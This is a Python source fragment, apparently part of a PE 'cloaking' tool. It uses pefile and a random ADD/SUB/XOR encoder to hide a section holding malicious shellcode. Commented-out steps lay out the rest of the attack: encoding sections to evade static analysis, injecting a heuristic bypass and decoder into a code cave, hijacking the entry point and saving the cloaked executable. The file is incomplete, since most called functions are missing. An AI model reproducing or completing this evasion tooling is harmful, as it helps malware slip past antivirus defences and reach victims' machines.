import random
import pefile


def get_section_header(pe, section_name):
	for section in pe.sections:
		if section_name.strip().lower() in section.Name.strip().lower():
			return section


def build_encoder():
	'''
	Set of instructions that will be used to encode the section that contains the malicious shellcode.
	'''
	list_of_encode_instruct = ['ADD', 'SUB', 'XOR']
	gen_encode_instruct = []
	no_of_encoded_instruct_to_gen = random.randint(5,10) 
	while no_of_encoded_instruct_to_gen > 0:
		modifier = random.randint(0,255)
		encode_instruction = random.choice(list_of_encode_instruct)
		gen_encode_instruct.append(encode_instruction + ' ' + str(modifier)) 
		no_of_encoded_instruct_to_gen -= 1
	return gen_encode_instruct









# # build the encoder
# encoder = build_encoder(heuristic_iterations)

# # encode the given section(s) to evade static analysis (returns corresponding decoder instructions)
# decoder = encode_data(pe, section_to_encode, encoder)

# # modify the entry instructions to rewrite any relative jump addresses that might exist
# # we pass the code_cave_address and length of heuristic bypass/decoder so we can determine the offset to the final
# # jump instructions that will appear at the end of the code cave to resume normal execution flow
# modified_entry_instructions = modify_entry_instructions(ep_ava, saved_entry_instructions, len(heuristic_bypass + decoder), code_cave_address)

# # replace first bytes of the entry point with jump to code cave
# print "[*] Overwriting first bytes at physical address %08x with jump to code cave" % (jmp_overwrite_location) 
# pe.set_bytes_at_offset(jmp_overwrite_location, code_cave_jump)

# # generate the instructions to restore execution flow 
# current_address = int(code_cave_address, 16) + len(heuristic_bypass + decoder + modified_entry_instructions)  # calculate current address from start of code cave
# new_entry_address = ep_ava + len(saved_entry_instructions) # the new entry address = old entry + length of the overwritten entry instructions
# restore_execution_flow = build_new_entry_jump(current_address, new_entry_address)

# # write heuristic defeating code and decoder to code cave
# write_codecave(pe, code_cave_section, code_cave_raw_offset, heuristic_bypass, decoder, modified_entry_instructions, restore_execution_flow)

# # write all changes to modified file
# save_cloaked_pe(pe, file)	